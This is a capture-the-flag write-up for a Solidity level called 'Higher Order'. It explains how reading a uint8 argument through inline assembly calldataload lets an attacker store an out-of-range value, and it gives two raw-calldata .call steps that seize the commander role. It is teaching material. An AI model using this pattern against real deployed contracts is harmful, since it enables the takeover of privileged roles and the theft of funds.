# Level 30: Higher Order

**Target:** [HigherOrder.sol](./HigherOrder.sol)

## Vulnerability

`registerTreasury(uint8)` reads its argument via inline assembly (`calldataload(4)`) instead of through Solidity's ABI decoder. Because `calldataload` always reads a full 32-byte EVM word, the `uint8` type annotation in the function signature is not enforced at runtime. Sending a manually crafted calldata payload with a value greater than 255 writes that value directly into the `treasury` storage slot, satisfying the `treasury > 255` guard in `claimLeadership()`.

## Key Concepts

**calldataload and the 32-byte Stack Word**
Every EVM opcode that pushes data onto the stack operates in 32-byte (256-bit) units. `calldataload(offset)` reads 32 bytes starting at `offset` and places the entire word on the stack. It has no concept of the Solidity type declared in the function signature; type enforcement is a compiler-level abstraction, not an EVM primitive.

**Unnamed Parameters and Compiler Type Checking**
`registerTreasury(uint8)` declares an unnamed parameter. The Solidity compiler performs type-boundary checks during ABI encoding of a *call*, not during execution inside the callee. If the call bypasses the compiler (i.e., uses a raw `.call` with manually encoded bytes), no type check occurs.

**Assembly Bypasses ABI Safety**
Inline `assembly` blocks opt out of Solidity's high-level safety guarantees. Any `sstore` driven by raw `calldataload` output inherits whatever the caller supplies, making it trivially exploitable when the caller controls the calldata.

**Manual Calldata Construction**
`abi.encodePacked(bytes4(selector), uint256(value))` produces a byte sequence that is a valid function call at the EVM level but violates the `uint8` constraint that the Solidity compiler would otherwise enforce.

## Root Cause

The developer delegated argument reading to assembly without adding a bounds check. The function signature guarantees a `uint8` only to compilers that generate the call — any direct calldata bypass makes the guarantee meaningless, because `calldataload` reads the full 32-byte word unconditionally.

## Exploit

Two raw `.call` invocations are sufficient:

| Step | Raw Calldata | Effect |
|------|-------------|--------|
| 1 | `registerTreasury(uint8)` selector + `uint256(1000)` | `treasury` slot ← 1000 |
| 2 | `claimLeadership()` selector | `treasury > 255` passes → `commander = msg.sender` |

```solidity
// Step 1: write treasury = 1000 — uint8 check exists only at compiler level
TARGET.call(
    abi.encodePacked(
        bytes4(keccak256("registerTreasury(uint8)")),
        uint256(1000)
    )
);

// Step 2: treasury > 255 satisfied — seize commander role
TARGET.call(abi.encodePacked(bytes4(keccak256("claimLeadership()"))));
```

## Real-World Reference

Type-confusion via assembly and raw calldata is structurally identical to vulnerabilities found in early DeFi routers that accepted user-supplied `bytes` swap payloads and decoded them with hand-rolled assembly. The resulting mismatch between the declared ABI and the actual executed payload has been exploited in several Arbitrary Call exploits — most notably in protocols that wrapped 1inch or 0x router calls without validating the decoded types, allowing callers to direct internal funds to attacker-controlled addresses.
